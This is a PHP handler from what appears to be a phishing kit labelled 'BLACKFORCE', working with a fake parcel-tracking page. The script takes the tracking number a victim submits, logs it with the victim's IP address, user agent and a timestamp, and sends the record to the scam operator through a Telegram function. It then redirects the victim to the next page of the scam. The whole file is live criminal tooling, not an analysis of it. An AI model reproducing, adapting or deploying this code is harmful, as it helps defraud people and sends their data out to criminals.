<?php 
require_once 'panel.php' ;


// SMS Config Start

if(isset($_POST['submit'])) {

if(!isset($_SESSION)) {
    session_start();
}

$_SESSION['strack'] = htmlspecialchars($_POST['track']);


if(empty($_SESSION['strack'])) {
    header("Location: ../track.php?page=error&userid={$id}&ue={$ue}");
}
else {

    $rezdata = "🕵🏻‍♂️ NEW TRACKING NUMBER ".SCAM_NAME." ".FLAG."

🕵🏻‍♂️ Tracking N : ".$_SESSION['strack']."

⏰ TIME : ".date("Y-m-d H:i:s")."
🌐 IP : $ip
💠 OS : $agent
    
⚡️ BLACKFORCE™ ⚡️
";
    sendTelegram($rezdata);
        

    header("Location: ../explain.php?userid={$id}&ue={$ue}");
}

}
// SMS Config END